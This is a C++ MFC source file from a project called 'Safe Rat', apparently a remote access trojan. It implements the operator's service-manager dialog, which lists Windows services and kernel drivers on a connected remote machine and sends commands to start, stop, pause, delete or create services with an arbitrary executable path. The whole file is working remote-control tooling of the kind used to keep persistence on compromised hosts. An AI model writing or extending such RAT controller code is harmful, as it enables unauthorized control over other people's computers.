// CServerDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CServerDlg.h"
#include "afxdialogex.h"
#include "CInputDlg.h"
#include "CServerInfoDlg.h"

#define ID_STATUS_SEARCH 41027
#define WM_SHOW_MSG (WM_USER+103)

UINT indicators[] =
{
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
		ID_SEPARATOR,           // status line indicator
};

// CServerDlg 对话框

IMPLEMENT_DYNAMIC(CServerDlg, CDialogEx)

CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_SERVER_DLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SERVER));
	m_bOnClose = FALSE;

	nServiceType = 0;
	m_nSortedCol = 1;
	m_bAscending = true;
}

CServerDlg::~CServerDlg()
{
	DestroyIcon(m_hIcon);

	delete m_wndComBox_search;
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_SERVER, m_list);
	DDX_Control(pDX, IDC_COMBO1, m_);
}


BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER, &CServerDlg::OnNMRClickListServer)
	ON_MESSAGE(WM_SHOW_MSG, OnShowMessage)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_SERVER, &CServerDlg::OnNMDblclkListServer)
	ON_CBN_SELCHANGE(IDC_COMBO1, &CServerDlg::OnCbnSelchangeCombo1)
END_MESSAGE_MAP()


// CServerDlg 消息处理程序




BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标


	CString str;
	str.Format("%s - 服务管理", m_pContext->m_RemoteIP);
	SetWindowText(str);

	InitView();

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
void CServerDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVICE_LIST:
		ShowServiceList();
		break;
	default:
		break;
	}

}

VOID CServerDlg::ShowServiceList()
{
	TCHAR* lpBuffer = (TCHAR*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	TCHAR* DisplayName;
	TCHAR* Describe;
	TCHAR* serRunway;
	TCHAR* serauto;
	TCHAR* Login;
	TCHAR* InterActive;
	TCHAR* ServiceName;
	TCHAR* serfile;

	DWORD	dwOffset = 0;

	m_list.DeleteAllItems();

	int i = 0;

	for (i = 0; dwOffset < (m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1) / sizeof(TCHAR); i++)
	{
		DisplayName = lpBuffer + dwOffset;
		Describe = DisplayName + lstrlen(DisplayName) + 1;
		serRunway = Describe + lstrlen(Describe) + 1;
		serauto = serRunway + lstrlen(serRunway) + 1;
		Login = serauto + lstrlen(serauto) + 1;
		InterActive = Login + lstrlen(Login) + 1;
		ServiceName = InterActive + lstrlen(InterActive) + 1;
		serfile = ServiceName + lstrlen(ServiceName) + 1;

		m_list.InsertItem(i, DisplayName, 0);
		m_list.SetItemText(i, 1, Describe);
		m_list.SetItemText(i, 2, serRunway);
		m_list.SetItemText(i, 3, serauto);
		m_list.SetItemText(i, 4, Login);
		m_list.SetItemText(i, 5, InterActive);
		m_list.SetItemText(i, 6, ServiceName);
		m_list.SetItemText(i, 7, serfile);

		dwOffset += lstrlen(DisplayName) + lstrlen(Describe) + lstrlen(serRunway) + lstrlen(serauto) + lstrlen(Login) + lstrlen(InterActive) + lstrlen(ServiceName) + lstrlen(serfile) + 8;
	}

	if (i <= 10)
	{
		strMsgShow.Format(_T("没有权限获取"), i);
	}
	else {

		strMsgShow.Format(_T("共 %d 个服务"), i);
	}

	PostMessage(WM_SHOW_MSG, 0, 0);
}
void CServerDlg::InitView()
{
	m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 150);
	m_list.InsertColumn(1, _T("描述"), LVCFMT_LEFT, 70);
	m_list.InsertColumn(2, _T("状态"), LVCFMT_LEFT, 70);
	m_list.InsertColumn(3, _T("启动类型"), LVCFMT_LEFT, 60);
	m_list.InsertColumn(4, _T("登陆身份"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(5, _T("桌面交互"), LVCFMT_LEFT, 60);
	m_list.InsertColumn(6, _T("服务名"), LVCFMT_LEFT, 100);
	m_list.InsertColumn(7, _T("可执行文件路径"), LVCFMT_LEFT, 250);

	m_ImgList.Create(16, 16, ILC_COLOR32 | ILC_MASK, 10, 0);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ICON_SERVER));
	m_list.SetImageList(&m_ImgList, LVSIL_SMALL);

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
			sizeof(indicators) / sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 70);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 130);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
	m_wndStatusBar.SetPaneInfo(4, m_wndStatusBar.GetItemID(4), SBPS_NORMAL, 130);

	m_wndStatusBar.SetPaneText(1, _T("搜索:"));
	m_wndStatusBar.SetPaneText(3, _T("选择服务类型"));

	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	//设置搜索
	RECT	rect;
	m_wndStatusBar.GetItemRect(2, &rect);
	m_wndComBox_search = new CXTPComboBox;
	m_wndComBox_search->CreateEx(NULL, _T("ComboBox"), NULL, WS_CHILD | WS_VISIBLE | WS_VSCROLL | CBS_DROPDOWN | WS_TABSTOP, rect, &m_wndStatusBar, ID_STATUS_SEARCH);
	m_wndComBox_search->SetFont(m_wndStatusBar.GetFont());
	m_wndComBox_search->AddString(_T("program files"));
	m_wndComBox_search->SetCurSel(0);

	//设置类型选择
	m_.SetParent(&m_wndStatusBar);
	m_wndStatusBar.GetItemRect(4, &rect);
	m_.MoveWindow(&rect);
	m_.AddString("WIN32服务");
	m_.AddString("驱动服务");
	m_.SetCurSel(0);
	m_.SetFont(m_wndStatusBar.GetFont());


	HWND hWndHeader = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);

	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());

	AdjustList();

	BYTE	bToken = COMMAND_SERVICE_LIST;
	m_iocpServer->Send(m_pContext, (LPBYTE)&bToken, 1);

}

void CServerDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom - 20;

	m_list.MoveWindow(&rectList);
}
void CServerDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnClose();

	CDialogEx::PostNcDestroy();
	delete this;
}

void CServerDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	CDialogEx::OnClose();
}
//右键
void CServerDlg::OnNMRClickListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 900, _T("创建(&C)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("启动(&S)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("停止(&O)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 300, _T("暂停(&U)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 400, _T("恢复(&M)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 500, _T("重新启动(&E)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 600, _T("刷新(&R)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 700, _T("属性(&R)"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 800, _T("删除服务(&D)"));

	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 100:
		SendToken(COMMAND_STARTSERVERICE);
		break;
	case 200:
		SendToken(COMMAND_STOPSERVERICE);
		break;
	case 300:
		SendToken(COMMAND_PAUSESERVERICE);
		break;
	case 400:
		SendToken(COMMAND_CONTINUESERVERICE);
		break;
	case 500:
	{	
		SendToken(COMMAND_STOPSERVERICE);
		Sleep(500);
		SendToken(COMMAND_STARTSERVERICE);
	}
	break;
	case 600:
		OnMenuitemRefreshService();
		break;
	case 700:
		OpenInfoDlg();
		break;
	case 800:
		SendToken(COMMAND_DELETESERVERICE);
		break;
	case 900:
		CreateSer();
	default:
		break;
	}

	menu.DestroyMenu();
	*pResult = 0;
}
//发送命令
void CServerDlg::SendToken(BYTE bToken)
{
	CString		tSerName;

	int		nItem = m_list.GetNextItem(-1, LVNI_SELECTED);
	tSerName = m_list.GetItemText(nItem, 6);

	int s = tSerName.Find(_T("*"));
	if (s == 0)
	{
		tSerName = tSerName.Right(tSerName.GetLength() - 1);
	}

	int nPacketLength = (tSerName.GetLength() * sizeof(TCHAR) + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = bToken;

	memcpy(lpBuffer + 1, tSerName.GetBuffer(0), tSerName.GetLength() * sizeof(TCHAR));
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);
	LocalFree(lpBuffer);
}
//刷新
void CServerDlg::OnMenuitemRefreshService()
{
	// TODO: Add your command handler code here
	BYTE bToken;
	if (!nServiceType)
		bToken = SERVICE_WIN32;
	else
		bToken = SERVICE_KERNEL_DRIVER;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}
//状态栏显示消息
LRESULT CServerDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
{
	m_wndStatusBar.SetPaneText(0, strMsgShow);
	return 0;
}

void CServerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (IsWindowVisible())
		AdjustList();

	// 状态栏还没有创建
	if (m_wndStatusBar.m_hWnd == NULL)
		return;

	// 定位状态栏
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示工具栏

	RECT	rect;
	m_wndStatusBar.GetItemRect(2, &rect);
	m_wndComBox_search->MoveWindow(&rect);

	m_wndStatusBar.GetItemRect(4, &rect);
	m_.MoveWindow(&rect);
}

void CServerDlg::OpenInfoDlg()
{
	int   nItem = -1;
	nItem = m_list.GetNextItem(nItem, LVNI_SELECTED);
	if (nItem == -1)
		return;

	CServerInfoDlg pDlg(this);

	pDlg.m_iocpServer = m_iocpServer;
	pDlg.m_pContext = m_pContext;

	pDlg.m_ServiceInfo.strSerName = m_list.GetItemText(nItem, 6);
	pDlg.m_ServiceInfo.strSerDisPlayname = m_list.GetItemText(nItem, 0);
	pDlg.m_ServiceInfo.strSerDescription = m_list.GetItemText(nItem, 1);
	pDlg.m_ServiceInfo.strFilePath = m_list.GetItemText(nItem, 7);
	pDlg.m_ServiceInfo.strSerRunway = m_list.GetItemText(nItem, 3);
	pDlg.m_ServiceInfo.strSerState = m_list.GetItemText(nItem, 2);

	pDlg.DoModal();
}
//双击列表
void CServerDlg::OnNMDblclkListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: Add your control notification handler code here
	OpenInfoDlg();
	*pResult = 0;
}
//截获回车消息
BOOL CServerDlg::PreTranslateMessage(MSG* pMsg)
{

	if (::GetDlgCtrlID(::GetParent(pMsg->hwnd)) == ID_STATUS_SEARCH)
	{
		UpdateData(TRUE);

		if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
		{
			UpdateData(TRUE);
			// 获取搜索关键词
			CString str;
			m_wndComBox_search->GetWindowText(str);
			if (str.IsEmpty())
				return TRUE;

			// 关键词插入combox
			m_wndComBox_search->InsertString(0, str);
			m_wndComBox_search->SetCurSel(0);


			// 复位上次搜索 设置有*号标志的取消  全部未选中
			CString Data;
			int nCut = m_list.GetItemCount();
			for (int i = 0; i < nCut; i++)
			{
				m_list.SetItemState(i, 0, LVIS_SELECTED);
				m_list.SetCheck(i, FALSE);


				Data = m_list.GetItemText(i, 6);
				int n = Data.Find('*');
				if (n == 0)
				{
					Data = Data.Right(Data.GetLength() - 1);
					m_list.SetItemText(i, 6, Data);
				}
				else
					continue;
			}

			int nSearch = 0;
			// 开始搜索
			for (int n = 0; n < nCut; n++)
			{
				// 复位行数据
				Data = "";
				// 得到行数据
				for (int i = 0; i < m_list.GetHeaderCtrl()->GetItemCount(); i++)
				{
					Data += m_list.GetItemText(n, i);
				}

				// 如果找到
				if (Data.Find(str, 0) != -1)
				{
					// 服务名前加 * 号
					CString strTemp, strFind;
					strFind = m_list.GetItemText(n, 6);
					int s = strFind.Find(_T("*"));
					if (s == 0)
					{
						strFind = strFind.Right(strFind.GetLength() - 1);
					}
					strTemp = "*";
					strTemp += strFind;

					// 	设置新服务名
					m_list.SetItemText(n, 6, strTemp);

					// 获取list 焦点 设置行选中
					m_list.SetFocus();
					m_list.SetItemState(n, LVIS_SELECTED, LVIS_SELECTED);
					m_list.SetCheck(n, TRUE);

					nSearch++;
				}
			}
			strMsgShow.Format(_T("找到 %d 个符合条件的服务"), nSearch);
			PostMessage(WM_SHOW_MSG, 0, 0);

			return TRUE;
		}
	}

	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}
//排序
void CServerDlg::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	CXTPSortClass csc(&m_list, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}
BOOL CServerDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY* pHDNotify = (HD_NOTIFY*)lParam;

	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		if (pHDNotify->iItem == m_nSortedCol)
			SortColumn(pHDNotify->iItem, !m_bAscending);
		else
			SortColumn(pHDNotify->iItem, m_heades.GetAscending() ? true : false);
	}

	return CDialog::OnNotify(wParam, lParam, pResult);
}
//切换类型
void CServerDlg::OnCbnSelchangeCombo1()
{
	UpdateData(TRUE);

	if (nServiceType == m_.GetCurSel())
		return;
	nServiceType = m_.GetCurSel();

	BYTE bToken;
	if (!nServiceType)
		bToken = SERVICE_WIN32;
	else
		bToken = SERVICE_KERNEL_DRIVER;

	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

//创建服务
void CServerDlg::CreateSer()
{
	CString ServerName;
	CString ShowName;
	CString Path;


	CInputDlg	dlg(this);
	dlg.Init(_T("创建服务"), _T("设置服务名:"));
	if (dlg.DoModal() != IDOK)
		return;
	//得到服务名
	ServerName = dlg.m_putdata;
	dlg.Init(_T("创建服务"), _T("设置显示名称:"));
	if (dlg.DoModal() != IDOK)
		return;
	//得到显示名称
	ShowName = dlg.m_putdata;

	dlg.Init(_T("创建服务"), _T("设置显示名称:"));
	if (dlg.DoModal() != IDOK)
		return;
	//得到程序路径
	Path = dlg.m_putdata;

	//判断三个框都不为空继续执行
	if (!ServerName.IsEmpty() && !Path.IsEmpty() && !ShowName.IsEmpty())
	{
		DWORD offset = 0;
		//计算字符串长度
		DWORD len = strlen(ServerName.GetBuffer()) + strlen(ShowName.GetBuffer()) + strlen(Path.GetBuffer()) + 4;
		//申请空间
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, len);
		if (lpBuffer)
		{
			lpBuffer[0] = COMMAND_CREATSERVERICE;
			offset++;

			memcpy(lpBuffer + offset, ServerName.GetBuffer(), ServerName.GetLength()+1);
			offset += ServerName.GetLength() + 1;

			memcpy(lpBuffer + offset, ShowName.GetBuffer(), ShowName.GetLength() + 1);
			offset += ShowName.GetLength() + 1;

			memcpy(lpBuffer + offset, Path.GetBuffer(), Path.GetLength() + 1);
			offset += Path.GetLength() + 1;

			m_iocpServer->Send(m_pContext, lpBuffer, len);

			LocalFree(lpBuffer);
		}

	}
}
